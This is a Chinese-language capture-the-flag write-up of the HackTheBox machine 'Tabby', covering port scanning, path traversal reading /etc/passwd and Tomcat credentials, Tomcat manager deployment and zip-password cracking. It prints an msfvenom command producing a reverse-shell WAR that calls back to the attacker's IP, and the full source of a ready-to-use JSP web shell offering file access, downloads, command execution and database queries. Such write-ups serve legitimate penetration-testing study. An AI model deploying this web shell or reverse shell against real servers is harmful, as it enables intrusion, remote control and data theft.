---
title: HackTheBox::Tabby
date: 2020-07-19
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180858.png
description: 
categories: 
- 渗透
tags:
- HackTheBox
- Tomcat
- 提权
---
### 信息搜集

扫一波端口：

```
root@wh1sper:~/tools/dirsearch# nmap -sT 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 05:37 PDT
Nmap scan report for 10.10.10.194 (10.10.10.194)
Host is up (0.27s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
 
Nmap done: 1 IP address (1 host up) scanned in 639.04 seconds
root@wh1sper:~/tools/dirsearch#
```

 

访问发现是个Tomcat的默认页面：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180905.png)

 

访问80端口，在首页发现news.php，不过这个域名没办法访问，把他修改成靶机的内网ip即可访问：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180912.png)

 

### 目录穿越+任意文件读取

在 `file=` 参数我们可以想到目录穿越漏洞，访问 `http://10.10.10.194/news.php?file=../../../../etc/passwd` 可以获取到passwd文件：

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

 

可以看到这个靶机上面出了root还用tomcat、ash等用户。

但是这个目录穿越只是任意文件读取，并不是文件包含漏洞：

```
root@wh1sper:~/tools/dirsearch# curl http://10.10.10.194/news.php?file=../../../../var/www/html/news.php
<?php
$file = $_GET['file'];
$fh = fopen("files/$file","r");
while ($line = fgets($fh)) {
  echo($line);
}
fclose($fh);
?>
root@wh1sper:~/tools/dirsearch#
```

 

我们可以看到他直接输出了PHP的代码，并没有去当作PHP执行，所以是任意文件读取。

我们回到Tomcat页面，页面最后一行提示了我们 `Users are defined in /etc/tomcat9/tomcat-users.xml` ，如果我们能读取这个文件的话，我们就可以用里面的用户名密码登录tomcat的管理后台了

但是页面提示的/etc/tomcat-users.xml并不能读取，后来网上查了下tomcat默认安装路径可能是/usr/share/tomcat9，于是尝试 `/usr/share/tomcat9/etc/tomcat-users.xml` ，成功读取到了文件：

```
root@wh1sper:~/HTB/machine/Tabby# curl http://10.10.10.194/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at
 
      http://www.apache.org/licenses/LICENSE-2.0
 
  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
root@wh1sper:~/HTB/machine/Tabby#
```

然后后台地址是： `10.10.10.194:8080/manager/` (这个登录不上)，另一个是 `10.10.10.194:8080/host-manager/html` 输入用户名tomcat密码$3cureP4s5w0rd123!就可以进去

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180921.png)

 

我们目的是Getshell，但是这个后台并不能文件上传，但但是tomcat可以独特地通过命令行去部署.war包

 

### Curl远程部署恶意war包

在tomcat-users.xml中写了tomcat用户没有manager-gui角色，因此无法登录manager/html页面，但是tomcat用户还具有manager-script角色，所以可以执行命令

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180957.png)

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120181009.png)



tomcat命令行部署war包：https://blog.csdn.net/chumo6161/article/details/100615971

tomcat manageapp操作方法：[http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html](http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html#Executing_Manager_Commands_With_Ant)



我们用一个免杀jsp马来制作好war包，然后通过curl远程部署到靶机上面：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120181020.png)

我的免杀base64用不了，换了msf的马：

```
root@wh1sper:~/HTB/machine/Tabby# msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.81 lport=10086 -f war -o Formalhaut.war
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of war file: 1538 bytes
Saved as: Formalhaut.war
root@wh1sper:~/HTB/machine/Tabby# ls
Formalhaut.war  JSP.jsp  shell.jsp  shell.war  wh1sper.war
root@wh1sper:~/HTB/machine/Tabby# unzip Formalhaut.war 
Archive:  Formalhaut.war
   creating: META-INF/
  inflating: META-INF/MANIFEST.MF    
   creating: WEB-INF/
  inflating: WEB-INF/web.xml         
  inflating: ubvqchbvesep.jsp        
root@wh1sper:~/HTB/machine/Tabby#
```

 

监听10086端口，访问jsp文件我们就能收到shell：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120181033.png)

同理可以上传一个jsp菜刀版用蚁剑连接使用图形化文件管理系统：

jsp菜刀版

```
<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!String Pwd = "pass";
 
    String EC(String s, String c) throws Exception {
        return s;
    }//new String(s.getBytes("ISO-8859-1"),c);}
 
    Connection GC(String s) throws Exception {
        String[] x = s.trim().split("\r\n");
        Class.forName(x[0].trim()).newInstance();
        Connection c = DriverManager.getConnection(x[1].trim());
        if (x.length > 2) {
            c.setCatalog(x[2].trim());
        }
        return c;
    }
 
    void AA(StringBuffer sb) throws Exception {
        File r[] = File.listRoots();
        for (int i = 0; i < r.length; i++) {
            sb.append(r[i].toString().substring(0, 2));
        }
    }
 
    void BB(String s, StringBuffer sb) throws Exception {
        File oF = new File(s), l[] = oF.listFiles();
        String sT, sQ, sF = "";
        java.util.Date dt;
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);
            sQ = l[i].canRead() ? "R" : "";
            sQ += l[i].canWrite() ? " W" : "";
            if (l[i].isDirectory()) {
                sb.append(l[i].getName() + "/\t" + sT + "\t" + l[i].length()
                        + "\t" + sQ + "\n");
            } else {
                sF += l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t"
                        + sQ + "\n";
            }
        }
        sb.append(sF);
    }
 
    void EE(String s) throws Exception {
        File f = new File(s);
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (int k = 0; k < x.length; k++) {
                if (!x[k].delete()) {
                    EE(x[k].getPath());
                }
            }
        }
        f.delete();
    }
 
    void FF(String s, HttpServletResponse r) throws Exception {
        int n;
        byte[] b = new byte[512];
        r.reset();
        ServletOutputStream os = r.getOutputStream();
        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
        os.write(("->" + "|").getBytes(), 0, 3);
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.write(("|" + "<-").getBytes(), 0, 3);
        os.close();
        is.close();
    }
 
    void GG(String s, String d) throws Exception {
        String h = "0123456789ABCDEF";
        int n;
        File f = new File(s);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i < d.length(); i += 2) {
            os
                    .write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d
                            .charAt(i + 1))));
        }
        os.close();
    }
  
    void HH(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File z[] = sf.listFiles();
            for (int j = 0; j < z.length; j++) {
                HH(s + "/" + z[j].getName(), d + "/" + z[j].getName());
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[512];
            while ((n = is.read(b, 0, 512)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
    }
 
    void II(String s, String d) throws Exception {
        File sf = new File(s), df = new File(d);
        sf.renameTo(df);
    }
 
    void JJ(String s) throws Exception {
        File f = new File(s);
        f.mkdir();
    }
 
    void KK(String s, String t) throws Exception {
        File f = new File(s);
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        java.util.Date dt = fm.parse(t);
        f.setLastModified(dt.getTime());
    }
 
    void LL(String s, String d) throws Exception {
        URL u = new URL(s);
        int n;
        FileOutputStream os = new FileOutputStream(d);
        HttpURLConnection h = (HttpURLConnection) u.openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[512];
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
    }
 
    void MM(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
    } 
 
    void NN(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        ResultSet r = c.getMetaData().getCatalogs();
        while (r.next()) {
            sb.append(r.getString(1) + "\t");
        }
        r.close();
        c.close();
    }
 
    void OO(String s, StringBuffer sb) throws Exception {
        Connection c = GC(s);
        String[] t = { "TABLE" };
        ResultSet r = c.getMetaData().getTables(null, null, "%", t);
        while (r.next()) {
            sb.append(r.getString("TABLE_NAME") + "\t");
        }
        r.close();
        c.close();
    }
 
    void PP(String s, StringBuffer sb) throws Exception {
        String[] x = s.trim().split("\r\n");
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1007);
        ResultSet r = m.executeQuery("select * from " + x[3]);
        ResultSetMetaData d = r.getMetaData();
        for (int i = 1; i <= d.getColumnCount(); i++) {
            sb.append(d.getColumnName(i) + " (" + d.getColumnTypeName(i)
                    + ")\t");
        }
        r.close();
        m.close();
        c.close();
    }
 
    void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {
        int i;
        Connection c = GC(s);
        Statement m = c.createStatement(1005, 1008);
        try {
            ResultSet r = m.executeQuery(q);
            ResultSetMetaData d = r.getMetaData();
            int n = d.getColumnCount();
            for (i = 1; i <= n; i++) {
                sb.append(d.getColumnName(i) + "\t|\t");
            }
            sb.append("\r\n");
            while (r.next()) {
                for (i = 1; i <= n; i++) {
                    sb.append(EC(r.getString(i), cs) + "\t|\t");
                }
                sb.append("\r\n");
            }
            r.close();
        } catch (Exception e) {
            sb.append("Result\t|\t\r\n");
            try {
                m.executeUpdate(q);
                sb.append("Execute Successfully!\t|\t\r\n");
            } catch (Exception ee) {
                sb.append(ee.toString() + "\t|\t\r\n");
            }
        }
        m.close();
        c.close();
    }%>
      
      
<%
    String cs = request.getParameter("z0")==null?"gbk": request.getParameter("z0") + "";
    request.setCharacterEncoding(cs);
    response.setContentType("text/html;charset=" + cs);
    String Z = EC(request.getParameter(Pwd) + "", cs);
    String z1 = EC(request.getParameter("z1") + "", cs);
    String z2 = EC(request.getParameter("z2") + "", cs);
    StringBuffer sb = new StringBuffer("");
    try {
        sb.append("->" + "|");
        if (Z.equals("A")) {
            String s = new File(application.getRealPath(request
                    .getRequestURI())).getParent();
            sb.append(s + "\t");
            if (!s.substring(0, 1).equals("/")) {
                AA(sb);
            }
        } else if (Z.equals("B")) {
            BB(z1, sb);
        } else if (Z.equals("C")) {
            String l = "";
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(new FileInputStream(new File(
                            z1))));
            while ((l = br.readLine()) != null) {
                sb.append(l + "\r\n");
            }
            br.close();
        } else if (Z.equals("D")) {
            BufferedWriter bw = new BufferedWriter(
                    new OutputStreamWriter(new FileOutputStream(
                            new File(z1))));
            bw.write(z2);
            bw.close();
            sb.append("1");
        } else if (Z.equals("E")) {
            EE(z1);
            sb.append("1");
        } else if (Z.equals("F")) {
            FF(z1, response);
        } else if (Z.equals("G")) {
            GG(z1, z2);
            sb.append("1");
        } else if (Z.equals("H")) {
            HH(z1, z2);
            sb.append("1");
        } else if (Z.equals("I")) {
            II(z1, z2);
            sb.append("1");
        } else if (Z.equals("J")) {
            JJ(z1);
            sb.append("1");
        } else if (Z.equals("K")) {
            KK(z1, z2);
            sb.append("1");
        } else if (Z.equals("L")) {
            LL(z1, z2);
            sb.append("1");
        } else if (Z.equals("M")) {
            String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
            Process p = Runtime.getRuntime().exec(c);
            MM(p.getInputStream(), sb);
            MM(p.getErrorStream(), sb);
        } else if (Z.equals("N")) {
            NN(z1, sb);
        } else if (Z.equals("O")) {
            OO(z1, sb);
        } else if (Z.equals("P")) {
            PP(z1, sb);
        } else if (Z.equals("Q")) {
            QQ(cs, z1, z2, sb);
        }
    } catch (Exception e) {
        sb.append("ERROR" + ":// " + e.toString());
    }
    sb.append("|" + "<-");
    out.print(sb.toString());
%>
```



 

### 提权

#### 爆破web路径压缩包密码

翻看他的web路径/var/www/html，在file文件夹下有一个加密的压缩包

蚁剑下载下来本地破解下密码；

。。。尝试了很多方法，跑了很久跑不出来，，最后还是去翻了wp，使用kali自带的/usr/share/wordlists/rockyou.txt.gz字典进行破解：

解压字典：

```
root@wh1sper:/usr/share/wordlists# ls
dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt.gz  wfuzz
root@wh1sper:/usr/share/wordlists# gzip -d rockyou.txt.gz 
root@wh1sper:/usr/share/wordlists# ls
dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt  wfuzz
```

开始爆破：

```
root@wh1sper:~/HTB/machine/Tabby# john zippass.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (1.zip)
1g 0:00:00:00 DONE (2020-07-21 07:47) 1.562g/s 16192Kp/s 16192Kc/s 16192KC/s adnc153..adenabuck
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@wh1sper:~/HTB/machine/Tabby#
```

，，，秒出，使用密码 `admin@it` 解压。

 

#### 提权ash用户

不过解压出来之后我们并不能发现压缩包里面有什么特别的，之前读取/etc/passwd的时候我们看到了有个ash用户，于是尝试用这个密码来登录ash用户：

```
su ash
Password: admin@it
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

果然可以成功！/home/user.txt就可以拿到手了